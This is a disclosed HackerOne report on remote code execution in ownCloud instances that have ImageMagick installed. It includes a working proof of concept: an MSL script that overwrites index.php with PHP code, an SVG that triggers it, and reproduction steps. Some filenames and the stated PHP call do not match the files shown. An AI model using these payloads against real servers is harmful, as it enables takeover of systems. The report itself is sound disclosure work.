---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1838674'
original_report_id: '1838674'
title: Remote Code Execution on ownCloud instances with ImageMagick installed
weakness: Code Injection
team_handle: owncloud
created_at: '2023-01-18T23:03:43.401Z'
disclosed_at: '2023-04-12T16:14:15.056Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
asset_identifier: owncloud/core
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- code-injection
---

# Remote Code Execution on ownCloud instances with ImageMagick installed

## Metadata

- HackerOne Report ID: 1838674
- Weakness: Code Injection
- Program: owncloud
- Disclosed At: 2023-04-12T16:14:15.056Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using [`OC\Preview\Bitmap`](https://github.com/owncloud/core/blob/83f600f8b89b62d52248dfdbc7046567be024b67/lib/private/Preview/Bitmap.php#L84-L92))

The prerequisite for exploitation seem to be:

- ImageMagick is installed (e.g. as [described in the ownCloud documentation](https://doc.owncloud.com/server/10.10/admin_manual/installation/manual_installation/manual_imagick7.html))
- The attacker knows the file path of a file that they uploaded (e.g. `/mnt/data/files/`)
- The attacker is able to upload files to the system (e.g. by using [File Drop Folders](https://owncloud.com/features/file-drop-folders/) or having an account)

To reproduce we have provided the following files:

- F2127559
```
FROM owncloud/server:10.11
RUN apt-get update && apt-get install -y imagemagick
```

- F2127558
```
<?xml version="1.0" encoding="UTF-8"?>
<image> 
  <read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <comment>&lt;?php echo php_uname(); ?&gt;</comment>
  <write filename="/var/www/owncloud/index.php" />
</image>
```

- F2127557
```
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
</svg>
```

Download these files and then perform the following steps:

- Build the docker image
   - `docker build . -t owncloud-imagemagick`
- Start the docker image
   - `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`
- Open the ownCloud instance at localhost:8080 and login using the username “admin” and the password “admin”.
   - Upload the file exploit.msl
   - Upload the file image.rgb
- Reload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)

{F2127565}

## Impact

Attackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
